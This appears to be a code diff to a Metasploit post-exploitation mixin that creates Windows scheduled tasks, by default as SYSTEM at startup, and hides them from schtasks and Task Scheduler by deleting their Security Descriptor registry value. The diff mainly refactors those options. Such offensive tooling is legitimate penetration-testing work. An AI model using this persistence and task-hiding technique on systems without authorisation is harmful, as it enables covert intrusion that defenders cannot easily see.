@@ -26,6 +26,10 @@ module Msf
         # the task is currently running (see
         # https://docs.microsoft.com/en-us/openspecs/windows_protocols/ms-erref/705fb797-2175-4a90-b5a3-3918024b10b8)
         SCHED_S_TASK_RUNNING = 0x00041301
+        DEFAULT_SCHEDULE_TASK_TYPE = 'ONSTART'.freeze
+        DEFAULT_SCHEDULE_MODIFIER = 1
+        DEFAULT_SCHEDULE_RUNAS = 'SYSTEM'.freeze
+        DEFAULT_SCHEDULE_OBFUSCATION_TECHNIQUE = 'SECURITY_DESC'.freeze
 
         def initialize(info = {})
           super
@@ -36,7 +40,7 @@ module Msf
                 'ScheduleType', [
                   true,
                   'Schedule frequency for the new created task.',
-                  'ONSTART',
+                  DEFAULT_SCHEDULE_TASK_TYPE,
                   %w[MINUTE HOURLY DAILY WEEKLY MONTHLY ONCE ONSTART ONLOGON ONIDLE]
                 ]
               ),
@@ -49,7 +53,7 @@ module Msf
                 'ScheduleModifier', [
                   false,
                   'Schedule frequency modifier to define the amount of \'ScheduleType\'',
-                  1
+                  DEFAULT_SCHEDULE_MODIFIER
                 ],
                 conditions: ['ScheduleType', 'in', %w[MINUTE HOURLY DAILY WEEKLY MONTHLY ONIDLE] ]
               ),
@@ -84,7 +88,7 @@ module Msf
                 'ScheduleRunAs', [
                   false,
                   'Execute the task under this user account (default: SYSTEM).',
-                  'SYSTEM'
+                  DEFAULT_SCHEDULE_RUNAS
                 ]
               ),
               # Hide the task from "schtasks /query" and Task Scheduler by
@@ -92,12 +96,13 @@ module Msf
               # Note that SYSTEM privileges are needed for this. It will try to
               # elevate privileges if the session is not already running under
               # the SYSTEM user.',
-              OptBool.new(
-                'ScheduleObfuscateTask', [
+              OptEnum.new(
+                'ScheduleObfuscationTechnique', [
                   false,
                   'Hide the task from "schtasks /query" and Task Scheduler (WARNING: the current '\
                   'session will be elevated to SYSTEM if it is not already) for this.',
-                  true
+                  DEFAULT_SCHEDULE_OBFUSCATION_TECHNIQUE,
+                  %w[NONE SECURITY_DESC]
                 ]
               )
             ], self.class
@@ -121,24 +126,34 @@ module Msf
         #   WEEKLY MONTHLY ONCE ONSTART ONLOGON ONIDLE.
         # @option opts [String] :modifier The schedule frequency modifier to define the amount of +:task_type+
         # @option opts [String] :runas The account under which the task will be executed
-        # @option opts [Boolean] :obfuscate When set to true, the task will be
-        #   hidden from "schtasks /query" and Task Scheduler when the OS support
-        #   it. The current session will be elevated to SYSTEM if it is not
-        #   already
+        # @option opts [String] :obfuscation The obfuscation technique used to
+        #   hide the task from "schtasks /query" and Task Scheduler when the OS
+        #   support it. The possible technique are:
+        #   - NONE: no obfuscation will be performed
+        #   - SECURITY_DESC: The Security Descriptor registry entry
+        #     corresponding to this task is removed to hide it. It will try to
+        #     elevate privileges if the session is not already running under
+        #     the SYSTEM user.
         # @option opts [String] :remote_system The remote system to connect to
         #   (prefer FQDN to IP). Not compatible with Windows XP/Server 2003.
         # @option opts [String] :username The user account to schedule the task remotely
         # @option opts [String] :password The password of the user account set in +:username+
         def task_create(task_name, task_cmd, opts = {})
           schtasks_cmd = ['/create']
-          task_type = opts[:task_type] || datastore['ScheduleType']
+          task_type = opts[:task_type] || (datastore['ScheduleType'].present? ? datastore['ScheduleType'] : DEFAULT_SCHEDULE_TASK_TYPE)
           schtasks_cmd += ['/tn', "\"#{task_name}\"", '/tr', "\"#{task_cmd}\"", '/sc', task_type]
           if %w[MINUTE HOURLY DAILY WEEKLY MONTHLY ONIDLE].include?(task_type)
-            modifier = opts[:modifier] || datastore['ScheduleModifier'].to_s
-            schtasks_cmd += ['/mo', modifier]
+            modifier = opts[:modifier] || (datastore['ScheduleModifier'].present? ? datastore['ScheduleModifier'].to_s : DEFAULT_SCHEDULE_MODIFIER.to_s)
+            if task_type == 'ONIDLE'
+              schtasks_cmd += ['/i', modifier]
+            else
+              schtasks_cmd += ['/mo', modifier]
+            end
           end
-          schtasks_cmd += ['/st', '00:00:00']
-          runas = opts[:runas] || (datastore['ScheduleRunAs'].present? ? datastore['ScheduleRunAs'] : 'SYSTEM')
+          unless %w[ONSTART ONLOGON ONIDLE].include?(task_type)
+            schtasks_cmd += ['/st', '00:00:00']
+          end
+          runas = opts[:runas] || (datastore['ScheduleRunAs'].present? ? datastore['ScheduleRunAs'] : DEFAULT_SCHEDULE_RUNAS)
           schtasks_cmd += ['/ru', runas]
           schtasks_cmd << '/f' unless @old_schtasks
 
@@ -150,11 +165,8 @@ module Msf
           end
 
           # We want to make sure `opts` has preference over the datastore option
-          if opts[:obfuscate].nil?
-            return unless datastore['ScheduleObfuscateTask']
-          else
-            return unless opts[:obfuscate]
-          end
+          obfuscation = opts.fetch(:obfuscation, datastore['ScheduleObfuscationTechnique'])
+          return if obfuscation.nil? || obfuscation == 'NONE'
 
           begin
             delete_reg_key_value("#{TASK_REG_KEY}\\#{task_name}", TASK_SD_REG_VALUE, opts)
@@ -188,18 +200,24 @@ module Msf
         #
         # @param [String] task_name The name of the task to be deleted
         # @param [Hash] opts The options to delete the task
-        # @option opts [Boolean] :obfuscate If the scheduled task has been
-        #   obfuscated (see #task_create), this must be set to true. This will
-        #   ensure the obfuscation is reverted before attempting to delete the
-        #   task. The system is unable to delete a task that is hidden.
+        # @option opts [String] :obfuscation The obfuscation technique used to
+        #   hide the task from "schtasks /query" and Task Scheduler when the OS
+        #   support it. Set this option to the correct technique in order to be
+        #   able to delete the task properly. The possible technique are:
+        #   - NONE: no obfuscation has been performed
+        #   - SECURITY_DESC: The Security Descriptor registry entry
+        #     corresponding to this task was removed to hide it. This will
+        #     restore it before attempting to delete the task. For this, it
+        #     will also try to elevate privileges if the session is not already
+        #     running under the SYSTEM user.
         # @option opts [String] :remote_system The remote system to connect to
         #   (prefer FQDN to IP). Not compatible with Windows XP/Server 2003.
         # @option opts [String] :username The user account to run the task remotely
         # @option opts [String] :password The password of the user account set in +:username+
         def task_delete(task_name, opts = {})
           # We want to make sure `opts` has preference over the datastore option
-          if (opts[:obfuscate].nil? && datastore['ScheduleObfuscateTask']) ||
-             (!opts[:obfuscate].nil? && opts[:obfuscate])
+          obfuscation = opts.fetch(:obfuscation, datastore['ScheduleObfuscationTechnique'])
+          if obfuscation && obfuscation != 'NONE'
             begin
               add_reg_key_value("#{TASK_REG_KEY}\\#{task_name}", TASK_SD_REG_VALUE, DEFAULT_SD, 'REG_BINARY', opts)
             rescue TaskSchedulerObfuscationError => e
@@ -252,8 +270,10 @@ module Msf
           # Also, on these OSes, `reg.exe` does not support the `/reg:64` flag.
           @old_schtasks = false
           @old_os = false
+          return unless sysinfo
           match = sysinfo['OS'].match(/(?<version>[\d.]+) Build/)
           return unless match
+
           if Rex::Version.new((match[:version])) < Rex::Version.new('6.0')
             @old_os = true
             unless sysinfo['OS'].include?('5.2 Build 3790, Service Pack 2')
@@ -298,7 +318,7 @@ module Msf
         end
 
         def schtasks_exec(schtasks_cmd_str, with_result: false)
-          log_and_print("[Task Scheduler] execute command: #{schtasks_cmd_str}")
+          log_and_print("[Task Scheduler] executing command: #{schtasks_cmd_str}")
           # Using a longer timeout in case the task scheduler operation takes place
           # on a remote host. The default timeout is not enough.
           result = cmd_exec_with_result(schtasks_cmd_str, nil, 240)
@@ -372,7 +392,7 @@ module Msf
           # again by #task_create when it checks if the registry key value
           # exists. This will enter an infinite loop, creating tasks on the
           # remote host until it explodes. We certainly don't want this to happen!
-          opts = { task_type: 'ONCE', runas: 'SYSTEM', obfuscate: false }
+          opts = { task_type: 'ONCE', runas: 'SYSTEM', obfuscation: 'NONE' }
           task_create(task_name, cmd, opts)
 
           log_and_print("[Task Scheduler] Starting the remote task #{task_name}")
@@ -432,7 +452,7 @@ module Msf
         end
 
         def delete_reg_key_value(reg_key, reg_value, opts = {})
-          log_and_print('[Task Scheduler] Remove the Security Descriptor registry key value to hide the task')
+          log_and_print('[Task Scheduler] Removing the Security Descriptor registry key value to hide the task')
 
           log_and_print('[Task Scheduler] Checking if the key value exists')
           unless reg_key_value_exists?(reg_key, reg_value)
@@ -462,7 +482,7 @@ module Msf
         end
 
         def add_reg_key_value(reg_key, reg_value, reg_data, reg_type, opts = {})
-          log_and_print('[Task Scheduler] Restore the Security Descriptor registry key value to unhide the task')
+          log_and_print('[Task Scheduler] Restoring the Security Descriptor registry key value to unhide the task')
 
           # Override by default. It has to be explicitely set to false if we don't want the key to be overriden.
           unless opts[:override].nil? || opts[:override]
